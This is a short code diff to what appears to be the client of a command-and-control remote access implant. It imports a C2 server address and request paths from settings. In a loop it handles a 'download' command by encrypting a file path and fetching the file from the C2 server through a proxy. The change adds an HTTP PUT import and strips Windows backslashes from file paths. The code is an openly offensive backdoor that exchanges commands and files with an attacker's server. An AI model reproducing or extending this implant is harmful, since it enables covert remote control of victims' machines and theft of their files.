@@ -6,7 +6,7 @@ from os import chdir, getenv, uname, getcwd
 
 import platform, socket, time
 from subprocess import PIPE, STDOUT, run
-from requests import exceptions, get, post
+from requests import exceptions, get, post, put
 from crypt import cipher
 from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
@@ -65,7 +65,7 @@ while True:
         filename = None
         try:
             filepath = cmd.split()[2] # command client download FILENAME
-            filename = filepath.rsplit("/", 1)[-1] 
+            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1] # clean windows backslash
             encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
             with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
                     if response.status_code == HTTPStatusCode.OK.value:
